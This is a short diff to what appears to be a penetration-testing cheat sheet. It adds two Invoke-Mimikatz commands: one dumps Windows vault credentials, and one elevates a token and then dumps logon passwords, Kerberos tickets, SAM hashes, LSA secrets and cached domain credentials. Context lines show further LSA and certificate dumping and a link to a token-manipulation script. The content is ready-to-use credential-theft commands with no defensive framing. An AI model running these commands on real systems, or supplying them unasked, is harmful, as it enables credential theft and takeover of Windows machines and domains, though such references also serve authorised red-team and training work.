@@ -212,6 +212,16 @@ Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
 Invoke-Mimikatz –DumpCerts
 ```
 
+#### Mimikatz dump vault
+```
+Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "vault::cred" "vault::list"'
+```
+
+#### Mimikatz dump all to find privs
+```
+Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "sekurlsa::tickets /export" "kerberos::list /export" "vault::cred" "vault::list" "lsadump::sam" "lsadump::secrets" "lsadump::cache"'
+```
+
 ## Token manipulation
 - https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-TokenManipulation.ps1
 
